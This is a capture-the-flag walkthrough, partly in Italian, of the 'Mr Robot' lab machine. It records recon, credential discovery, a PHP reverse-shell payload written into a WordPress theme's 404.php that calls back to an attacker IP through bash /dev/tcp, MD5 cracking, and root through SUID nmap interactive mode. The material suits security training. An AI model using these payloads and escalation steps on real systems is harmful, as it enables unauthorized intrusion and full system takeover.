# Mr Robot CTF - Recon

Target: 10.112.137.36

## Nmap

- Porte aperte:
  - `22/tcp` → SSH
  - `80/tcp` → HTTP
  - `443/tcp` → HTTPS

- Servizi:
  - `22/tcp` → OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
  - `80/tcp` → Apache httpd
  - `443/tcp` → Apache httpd con SSL
  - OS rilevato: Linux / Ubuntu

- Note:
  - Il sito espone un’applicazione web su HTTP e HTTPS.
  - La porta SSH è aperta, ma inizialmente non abbiamo credenziali per accedere.
  - La superficie principale da analizzare è il servizio web.
  - Nmap non mostra titoli utili: `Site doesn't have a title`.

## Web

- Homepage:
  - URL: `http://10.112.137.36`
  - Il sito risponde correttamente su HTTP.
  - Dalla struttura trovata sembra essere un sito WordPress.
  - Sono presenti path tipici di WordPress:
    - `/wp-admin`
    - `/wp-content`
    - `/wp-includes`
    - `/wp-login`
    - `/wp-login.php`

- robots.txt:
  - URL: `http://10.112.137.36/robots.txt`
  - Status: `200`
  - File interessante perché contiene risorse nascoste.
  - Findings:
    - `fsocity.dic`
    - `key-1-of-3.txt`

- Directory interessanti:
  - `/admin` → redirect
  - `/dashboard` → redirect a `/wp-admin/`
  - `/login` → redirect a `/wp-login.php`
  - `/wp-admin` → WordPress admin area
  - `/wp-login` → WordPress login
  - `/wp-content` → WordPress content directory
  - `/wp-includes` → WordPress core directory
  - `/license` → file interessante con testo nascosto/Base64
  - `/readme` → file informativo
  - `/phpmyadmin` → `403 Forbidden`, esiste ma non accessibile
  - `/xmlrpc.php` → `405 Method Not Allowed`, endpoint WordPress presente
  - `/intro` → file grande, video
  - `/audio` → directory
  - `/images` → directory
  - `/video` → directory
  - `/js` → directory
  - `/css` → directory

- File trovati:
  - `/robots.txt`
  - `/fsocity.dic`
  - `/key-1-of-3.txt`
  - `/license`
  - `/readme`
  - `/index.html`
  - `/wp-login.php`
  - `/xmlrpc.php`

- WordPress?
  - Sì, il sito è WordPress.
  - Confermato da:
    - `/wp-admin`
    - `/wp-login.php`
    - `/wp-content`
    - `/wp-includes`

- Login?
  - Login WordPress trovato su:
    - `http://10.112.137.36/wp-login.php`
  - Credenziali trovate nel file `/license` tramite Base64 decode:
    - username: `elliot`
    - password: `ER28-0652`
  - Accesso WordPress riuscito come `elliot`.

- Wordlist?
  - Wordlist trovata tramite `robots.txt`:
    - `fsocity.dic`
  - Comandi usati:
    ```bash
    wget http://10.112.137.36/fsocity.dic -O loot/fsocity.dic
    sort -u loot/fsocity.dic -o loot/fsocity_unique.dic
    ```

- File scaricati?
  - `fsocity.dic`
  - `key-1-of-3.txt`
  - `license.txt`
  - `robots.txt`

- Prossimi step tecnici:
  - Usare accesso WordPress per modificare un file PHP del tema.
  - Inserire reverse shell in `404.php`.
  - Ottenere shell come utente `daemon`.
  - Enumerare `/home/robot`.
  - Leggere `password.raw-md5`.
  - Crackare hash MD5 con John.
  - Usare `su robot`.
  - Leggere `key-2-of-3.txt`.
  - Cercare binari SUID.
  - Abusare `/usr/local/bin/nmap --interactive`.
  - Ottenere root.
  - Leggere `/root/key-3-of-3.txt`.


1. Nmap scan
2. Web enumeration
3. robots.tx
4. key1 + fsocity.dic
5. /license
6. Base64 decode
7. WordPress login as elliot
8. Modify 404.php
9. Reverse shell as daemon
10. /home/robot
11. Read password.raw-md5
12. Crack MD5 with John
13. su robot
14. Read key2
15. Find SUID binaries
16. Abuse nmap interactive mode
17. Root
18. Read key3


### COMMAND

## Setup
```
export TARGET=10.112.137.36
mkdir -p ~/thm/mrrobot/{scans,loot,notes}
cd ~/thm/mrrobot
```
## Recon
```
nmap -sC -sV -oN scans/initial.txt $TARGET
```
## Directory enumeration
```
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o scans/gobuster_ext.txt
```
## robots.txt
```
curl -s http://$TARGET/robots.txt | tee notes/robots.txt
wget http://$TARGET/fsocity.dic -O loot/fsocity.dic
wget http://$TARGET/key-1-of-3.txt -O loot/key-1-of-3.txt
cat loot/key-1-of-3.txt
```
## Clean wordlist
```
sort -u loot/fsocity.dic -o loot/fsocity_unique.dic
```
## license
```
curl -s http://$TARGET/license | tee notes/license.txt
grep -Eo '[A-Za-z0-9+/=]{20,}' notes/license.txt
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
```
## Listener
```
ip addr show tun0
nc -lvnp 4444
```
## Reverse shell payload in 404.php
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1'");
?>
```
## Stabilize shell
```
whoami
id
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
## Robot user
```
cd /home/robot
ls -la
cat password.raw-md5
```
## Crack hash
```
echo 'c3fcd3d76192e4007dfb496cca67e13b' > loot/robot_hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt loot/robot_hash.txt
john --show --format=Raw-MD5 loot/robot_hash.txt
```
## Switch user
```
su robot
whoami
cat /home/robot/key-2-of-3.txt
```
## Privilege escalation
```
find / -perm -4000 -type f 2>/dev/null
ls -la /usr/local/bin/nmap
/usr/local/bin/nmap --interactive
```
## Inside nmap
```
!sh
```
## Root
```
whoami
id
cat /root/key-3-of-3.txt
```